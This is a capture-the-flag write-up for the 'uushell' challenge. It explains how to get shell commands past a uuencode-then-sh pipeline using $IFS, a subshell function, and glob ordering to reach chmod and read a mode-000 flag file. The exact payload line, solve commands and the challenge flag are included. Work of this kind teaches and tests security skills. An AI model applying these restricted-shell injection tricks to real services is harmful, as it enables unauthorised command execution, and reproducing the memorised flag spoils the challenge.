# uushell

**Category:** misc · **Points:** 106 · **Solves:** 61 · **Author:** pspaul

## Challenge

> Are youu capable of uunderstanding the uushell?

The handout is a Dockerfile, a `compose.yml` and a dummy `flag.txt`. The container runs

```dockerfile
COPY --chown=nobody --chmod=000 flag.txt /flag
USER nobody
CMD ["socat", "tcp-l:1337", "system:uuencode x | sed -n 2p | sh"]
```

so everything you send on the socket is stdin of `uuencode x`, and **only line 2 of its output** —
the single data line — is handed to `sh`. `socat` has no `fork`, so an instance accepts exactly one
connection; the challenge explicitly asks you to solve it locally first and only then open an
instance.

The flag is `/flag`: mode `000`, owner `nobody`, and the service runs as `nobody`. So the process
*owns* the file but cannot read it. `chmod` is the primitive, `cat` is not.

## TL;DR

uuencode emits `chr(6bit + 32)` per 6-bit group, so the 61-character line you get to write only
covers `0x21`–`0x5f` (plus backtick): no space, no lowercase — therefore no command names and, since
`c` is untypeable, no `sh -c`. The way out is a shell function whose body is a subshell:
`M()(...)` gives you `$1`, `$2`, … without `-c`, and `(` `)` replaces braces. The leading length
character is forced to `M`, so the function name costs nothing. Two calls to `M`, both fed by glob
expansion, first run `bin/chmod 500 /flag`, then execute `/flag` as a script so that `dash` prints
its content in a "not found" error message.

## Files

| file | description |
|---|---|
| `Dockerfile` | the service image |
| `compose.yml` | publishes `3337:1337`, `restart: 'no'` (one shot) |
| `flag.txt` | `flag{fake}`, copied to `/flag` |
| `solve.py` | builds the 45 raw bytes that encode to the payload line |

## Analysis

### What actually reaches the shell

`uuencode x` reads our stdin and writes three lines:

```
begin 644 x
M<60 characters>
`
end
```

`sed -n 2p` keeps only the data line. Its format is: one length character `chr(n + 32)` where `n` is
the number of input bytes, followed by `4*ceil(n/3)` data characters. Choosing `n = 45` makes the
length character `chr(77)` = `M` and gives exactly 60 data characters — one line, 61 bytes, and the
first of them is not ours to choose.

The data characters are `chr(v + 32)` for 6-bit groups `v`, so the alphabet is `0x21`–`0x5f`, plus
(sharutils' special case for zero) a backtick. Missing are space, every lowercase letter, `|`
(`0x7c`), `{` (`0x7b`), `}` (`0x7d`) and `~` (`0x7e`); present are `$ ( ) ; & * ? [ ] ! \ # < >` and
the rest of the punctuation range. Two consequences:

- no space → `$IFS`
- **no lowercase at all**, so no `cat`, no `sh`, no options, and crucially no `c` — both
  `sh -c` and `bash -c` are unspellable, and so is every command name

`solve.py` inverts the encoding, so the writeup only ever deals with the line text:

```
M()($4$IFS\500$IFS????;$2)2>&1;M$IFS*/?[!2]???;M$IFS/????
;###
```

(61 chars; the split after `????` is only for reading.)

### Getting positional parameters without `sh -c`

`sh -c '…'` is the usual way to run a script whose text you control, and it is impossible here: no
lowercase `c`, no quotes, no space. The trick is that a shell function definition takes parameters
for free, and its body may be any compound command:

```sh
M()($4$IFS\500$IFS????;$2)
```

- `M()(...)` — a function whose body is a **subshell**, so no `{` `}` are needed (they would be
  untypeable anyway).
- The `M` in front is the forced length character, doubling as the function name — the one character
  we must spend is spent on something useful.
- `2>&1` after the definition: `socat`'s `system:` gives the child our socket as stdout, but keeps
  stderr for itself, so without this redirection all output is lost in the container log. A
  redirection attached to a function definition applies on each call, so both calls report back.
- `$4$IFS\500$IFS????` is `chmod 500 ????`: `$4` is the command, `\500` the literal mode. The
  backslash is needed because `$IFS500` parses as one variable named `IFS500` (digits are valid in a
  variable name): it expands to nothing, `????` slips into the mode position, and chmod fails with
  `invalid mode: 'boot'`.
- `;$2` is the second command of the body: for the first call it is a harmless `bin/chcon` usage
  error, for the second call it is `/flag` — the read primitive.

### Choosing the commands: glob order

No command name can be typed, so the commands must arrive as glob expansions. `dash` runs the
*first* word as the command and passes the rest as arguments, so a glob that expands to
`bin/chage bin/chcon bin/chgrp bin/chmod bin/choom …` gives exactly what we need at `$2` and `$4`.
The pattern `?[!2]???` matches five-character names, not six — `?`, a class, then three `?`:

```
M$IFS*/?[!2]???     -> M bin/chage bin/chcon bin/chgrp bin/chmod bin/choom bin/chown …
                        $1=chage   $2=chcon   $3=chgrp   $4=chmod     (92 matches in /)
```

Why the `[!2]`: without it, `*/?????` starts with `bin/b2sum` and every entry shifts by one slot,
so `$4` would be `bin/chgrp` — the wrong tool, and the flag would stay at mode `000`. The negated
class drops exactly one name, `bin/b2sum`, because a `2` in the second character position occurs
nowhere else in `/bin` (93 matches become 92). Sorting stays alphabetical, which is what puts
`chmod` fourth.

A bracket expression cannot be used to *select* `chmod` directly: every typeable range endpoint is
`≤ 0x60` while lowercase starts at `0x61`, so no positive range covers lowercase letters, and a
negated range covers all of them. Glob order is the only lever.

The body is `$4 500 ???? ; $2`, and `????` globs the four-letter entries of the current directory,
which for `socat system:` is `/`: `boot flag home proc root sbin`. Only `flag` belongs to us, so
`bin/chmod` succeeds on it and fails on the rest with `Operation not permitted`.

Second call:

```
M$IFS/????          -> M boot flag home proc root sbin
                        $1=boot $2=flag $3=home $4=proc
```

(`/flag` is second because sorting is on the whole path and `boot < flag < home < proc`.)

Now the body is `/proc 500 boot flag home proc root sbin; /flag`. `/proc` cannot be executed
(`Permission denied`), and `/flag` — now mode `500` — has no shebang, so the kernel returns
`ENOEXEC`, `dash` falls back to interpreting it, and the file's only line `flag{…}` is run as a
command. The resulting `/flag: 1: flag{…}: not found` on stderr is our flag. This assumes the flag
has no whitespace or shell metacharacters, which is true for the `flag{…}` format.

## Solution

### 1. Local instance

```bash
mkdir -p uu && cd uu
unzip /path/to/6-uushell.zip
printf 'flag{local_test_flag}' > flag.txt   # the shipped one is a dummy
docker build -t uushell .                   # needs BuildKit for COPY --chmod
docker run -d --name uu -p 1337:1337 uushell
```

Without BuildKit, `docker build` refuses `COPY --chmod=000`; use `COPY` plus
`RUN chown nobody /flag && chmod 000 /flag` instead — the result is identical.

### 2. Send the payload

```bash
python3 solve.py --tcp 127.0.0.1 1337
```

Observed (this is the full reply, one connection, one payload):

```
bin/chmod: changing permissions of 'boot': Operation not permitted
bin/chmod: changing permissions of 'home': Operation not permitted
bin/chmod: changing permissions of 'proc': Operation not permitted
bin/chmod: changing permissions of 'root': Operation not permitted
bin/chmod: changing permissions of 'sbin': Operation not permitted
bin/chcon: missing operand
Try 'bin/chcon --help' for more information.
sh: 1: /proc: Permission denied
/flag: 1: flag{local_test_flag}: not found
```

The container exits after that single connection, which is exactly why the challenge tells you to
practise locally.

### 3. Remote, one shot

The instance is served over TLS and, being one-shot, must not be probed first. Build the 45 bytes
and let `socat` do a proper TLS shutdown — `uuencode` emits nothing until it sees EOF, and the
server needs a real `close_notify`, so a bare FIN (e.g. from `SSLSocket.shutdown`) gets an alert
record back instead of the pipeline running:

```bash
python3 solve.py --emit > payload.bin
socat - openssl:$HOST:$PORT,verify=0 < payload.bin | tail -1
```

`ncat --ssl $HOST $PORT < payload.bin` works equally well. The last line is
`/flag: 1: flag{youu_are_the_uundispuuted_champion_of_uushell}: not found`.

## Flag

```
flag{youu_are_the_uundispuuted_champion_of_uushell}
```

## Notes

- The payload is 57 characters of script (`M` + 56), padded to 60 with `;###`. The filler must begin
  with a metacharacter: `$IFS###` glued onto the previous command would turn into a redirection to
  the word `1$IFS###` and fail with `Syntax error: Bad fd number`.
- 45 bytes is a hard ceiling: `sed -n 2p` drops every further line, so longer scripts are not
  possible. The payload fits with three characters to spare.
- Don't connect "just to check" that the instance is up — the check consumes the one connection.
- `/flag` has no shebang; executing it as a *script* is what makes its content readable, and the
  `not found` message is what prints it. A flag containing a space would only print its first word.
